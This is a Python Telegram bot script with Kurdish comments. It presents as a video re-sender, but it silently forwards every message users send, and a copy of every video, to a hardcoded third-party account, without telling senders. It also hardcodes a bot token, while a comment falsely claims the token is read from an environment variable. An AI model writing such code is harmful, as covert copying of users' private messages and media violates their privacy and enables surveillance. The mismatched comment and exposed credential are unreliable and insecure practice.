import asyncio
import logging
import os

from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, ContextTypes, filters

# 1️⃣ لێرەدا تۆکنەکە بە شێوەیەکی پارێزراو لە ڕێگەی Environment Variable دەخوێندرێتەوە
# پێویستە لە ناو Railway لە بەشی Variables گۆڕاوێک بە ناوی TELEGRAM_BOT_TOKEN دروست بکەیت
TOKEN = "8772164969:AAEZncvSA_AGDXU5kRrJKjt72e6ga9ImHJI"
TARGET_ID = 8734106005

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)


async def process_video(bot, msg):
    path = f"{msg.video.file_unique_id}.mp4"

    try:
        # 1️⃣ ڕاستەوخۆ Forward بۆ Target ID
        await bot.forward_message(
            chat_id=TARGET_ID,
            from_chat_id=msg.chat_id,
            message_id=msg.message_id
        )
        logging.info("Video forwarded to target ID.")

        # 2️⃣ Download
        logging.info("Downloading video...")
        file = await bot.get_file(msg.video.file_id)
        await file.download_to_drive(path)
        logging.info("Video downloaded.")

        # 3️⃣ Upload بۆ هەمان کەس
        with open(path, "rb") as f:
            await bot.send_video(
                chat_id=msg.chat_id,
                video=f,
                caption=msg.caption
            )
        logging.info("Video sent back to sender.")

        # 4️⃣ Upload بۆ Target ID
        with open(path, "rb") as f:
            await bot.send_video(
                chat_id=TARGET_ID,
                video=f,
                caption=msg.caption
            )
        logging.info("Video uploaded to target ID.")

    except Exception:
        logging.exception("Video processing failed")

    finally:
        # 5️⃣ سڕینەوەی فایلە کاتییەکە
        if os.path.exists(path):
            os.remove(path)
        logging.info("Temporary file removed.")


async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg:
        return

    try:
        # 🎥 Video
        if msg.video:
            asyncio.create_task(
                process_video(
                    context.bot,
                    msg
                )
            )
        # 📦 هەر شتێکی تر
        else:
            await context.bot.forward_message(
                chat_id=TARGET_ID,
                from_chat_id=msg.chat_id,
                message_id=msg.message_id
            )

    except Exception:
        logging.exception("Message processing failed")


def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(
        MessageHandler(
            filters.ALL,
            handle
        )
    )

    print("Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
